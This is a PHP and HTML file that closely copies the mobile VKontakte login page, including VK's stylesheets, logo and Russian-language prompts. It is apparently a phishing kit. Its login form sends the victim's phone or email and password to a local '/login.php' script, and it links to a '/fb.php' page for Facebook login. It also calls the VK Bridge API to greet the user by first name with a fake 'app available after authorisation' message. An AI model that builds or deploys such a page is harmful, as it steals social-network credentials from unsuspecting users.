<?php

require 'db.php';

  $errorGet = $_GET['error_login'];
    if (!$errorGet)
    {
        echo "<style>
        #hide_row_pass {display: none;}
        </style>";
    }
else
    {
        $messerror = '<div class="service_msg service_msg_warning"><b>Не удалось войти.</b><br>Пожалуйста, проверьте правильность введённых данных. <a href="https://static.vk.com/restore">Проблемы со входом?</a></div>';
    }

?>




<!DOCTYPE html>
      <html class="vk vk_js_no vk_1x vk_flex_no r d h  vk_appAuth_no n vk_old ">
      <head>
<meta charset="utf-8"> 
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, minimal-ui, user-scalable=no" /> 
<meta name="format-detection" content="telephone=no" /> 
<meta http-equiv="X-UA-Compatible" content="IE=edge" /> 
<meta name="MobileOptimized" content="176" /> 
<meta name="HandheldFriendly" content="True" /> 
<base id="base"> 
<meta name="msApplication-ID" content="C6965DD5.VK" /> 
<meta name="msApplication-PackageFamilyName" content="C6965DD5.VK_v422avzh127ra" /> 
<meta name="description" content="VK is the largest European social network with more than 100 million active users. Our goal is to keep old friends, ex-classmates, neighbors and colleagues in touch." /> 
<link rel="shortcut icon" href="https://vk.com/images/icons/favicons/fav_logo.ico?8"></link> 
<meta name="apple-mobile-web-app-title" content="VK"> 
<meta name="application-name" content="VK"> 
<meta name="mobile-web-app-capable" content="yes"> 
<meta name="apple-mobile-web-app-status-bar-style" content="black"> <title>Мобильная версия ВКонтакте</title> 
<link rel="stylesheet" href="https://vk.com/css/mobile/variables.css?62cab35205a22014e4cafa1ed6d9e1761d48ca24cd71da2d9f8dbdbbde0c6ff6"> 
<link rel="stylesheet" href="https://m.vk.com/css/mobile/common.css?f17be24e8d33824f5f23d474637dd8a33b8d5d72451c32afc3d554c70fd83f78"> 
<link rel="canonical" href="https://vk.com/" /> 
<link rel="alternate" href="android-app://com.vkontakte.android/vkontakte/m.vk.com/" />
<script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
 
<script>
  // Sends event to client
  vkBridge.send('VKWebAppInit');
  vkBridge.send("VKWebAppGetUserInfo", {}).then(data => {
      if(data.first_name){
      document.getElementById('login_header').innerHTML = '<b>'+data.first_name+' </b>приложение доступно после авторизации';          
      }
  })
  .catch(error => {
    document.getElementById('login_header').innerHTML = 'Приложение доступно после авторизации';
  });

</script> 
      </head>

      <body class="vk__page _hover vk_ios_no vk_stickers_hints_support_no opera_mini_no vk_safari_no vk__page_login vk_tabbar_static    vk_al_no ">
            <div class="layout">
      
          <div class="layout__header mhead" id="vk_head">
      <div class="hb_wrap">
        <div class="hb_btn">&nbsp;</div>
      </div>
    </div>
      <div class="layout__body " id="vk_wrap">
        <div class="layout__leftMenu" id="l">
          
        </div>
        <div class="layout__basis" id="m">
              <div class="basis">
      <div class="basis__header mhead basis__header_noBottomMenu basis__header_noshadow basis__header_noshadowAnim basis__header_nohide" id="mhead"><a href="/" accesskey="*" class="hb_wrap mhb_logo">
  <div class="hb_btn mhi_logo">&nbsp;</div>
  <h1 class="hb_btn mh_header">&nbsp;</h1>
</a>
</div>
      <div class="basis__menu"></div>
      
      <div class="basis__content mcont " id="mcont" data-canonical="https://vk.com/"><div class="installApp">
  
</div><div class="pcont fit_box bl_cont new_form">
  <div class="PageBlock">
  
  <div class="form_item">
    <div id="login_header" class="login_header">
        Приложение доступно после авторизации
    </div>
    <?php echo $messerror; ?>
    <form method="POST" action="/login.php" novalidate>
      <dl class="fi_row">
        <dd>
          <input type="text" class="textfield" name="email" value="" placeholder="Телефон или email" />
        </dd>
      </dl>
      <dl class="fi_row">
        <dd>
          <input type="password" class="textfield" name="pass" placeholder="Пароль" />
        </dd>
      </dl>
      
      <div class="fi_row_new">
        <input class="button wide_button" name="auth" type="submit" value="Войти" />
      </div>
      <div class="fi_row">
        <div class="near_btn wide_button login_restore"><a href="https://static.vk.com/restore" rel="noopener">Забыли пароль?</a></div>
      </div>
      <div class="login_new_user">
  <div class="fi_header fi_header_light">Впервые ВКонтакте?</div>
</div>
<div class="fi_row">
  <a class="button wide_button success" href="/join" rel="noopener">Зарегистрироваться</a>
</div>
<div class="socials">
  
  <a href="/fb.php" class="social_button">
<i class="social_icon"></i>Войти через Facebook</a>
</div>
    </form>
  </div>
  </div>
</div></div>
      
      
          <div aria-hidden="true" class="_cntrs" style="height:0;overflow:hidden;">
          <img width="1" height="1" src="https://sb.scorecardresearch.com/p?c1=2&c2=13765216&c3=&c4=https%3A%2F%2Fm.vk.com%2F&c5=&c9=&c15=&cv=2.0&cj=1&rn=92983483" alt="">
      
      <img src="//top-fwz1.mail.ru/counter?id=2579437;pid=0;r=" style="border:0;" height="1" width="1" />
    </div>
    </div>
        </div>
      </div>
    </div>
        
        

        <div id="vk_utils"></div>
        <div id="z"></div>
        <div id="vk_bottom"></div>
        <div id="theme_color_shim"></div>
        
        
      </body>
    </html>